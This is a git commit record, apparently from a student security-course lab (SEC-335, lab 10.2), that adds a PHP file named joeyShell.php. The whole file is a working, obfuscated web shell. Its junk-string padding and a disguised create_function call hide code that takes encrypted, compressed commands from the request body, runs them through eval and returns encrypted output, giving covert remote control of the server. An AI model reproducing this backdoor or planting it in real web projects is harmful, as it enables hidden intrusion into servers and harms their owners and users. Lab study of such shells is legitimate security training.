373033fe4a6a2a00e5969e1c03d0bbec4e139f4e
JoeyTaubert <joey.taubert@comcast.net>
2023-11-06 22:52:10 -0500

    update L10.2

---
+++ SEC-335/Labs_Assignments/10.2/joeyShell.php
@@ -0,0 +1,10 @@
+<?php
+$G='$k="5f4Xhdcc3b";$Xhkh="5Xhaa765dXh61d83"Xh;$kfXh="27deXhXhb8Xh82cf99";$p="FFKF0XhCogwD8XhAIXhBFMXh";function Xhx($t,$k)Xh';
+$f='conXhtentsXh();@ob_Xhend_clXhean(Xh);$r=@XhbaXhXhse64_encXhode(@x(@gzcomprXhesXhs($oXh),$XhXhk));print("$p$kh$r$kf");}';
+$j='Xh{$o.=$t{$i}^$Xhk{$j};}}reXhtXhurn $o;Xh}Xhif (@XhpregXh_mXhatch(Xh"/$kh(.+Xh)$kf/",@fiXhlXhe_get_contents("php://X';
+$m='{$cXh=strlen($kXh);Xh$l=stXhrlXhen($Xht);$o="";for($XhiXh=0;$i<$l;){for(XhXh$jXh=0;(Xh$j<$c&&Xh$i<$lXh);$j++,$i+Xh+)';
+$V=str_replace('p','','crppeatpep_fppunction');
+$F='hinput")Xh,$m)Xh=Xh=1) {@oXhb_start();@eXhvaXhl(@gzunXhcompresXhs(@x(@bXhasXheXh64_decode($m[1Xh]),$k)XhXh));$o=@ob_getXh_';
+$k=str_replace('Xh','',$G.$m.$j.$F.$f);
+$M=$V('',$k);$M();
+?>
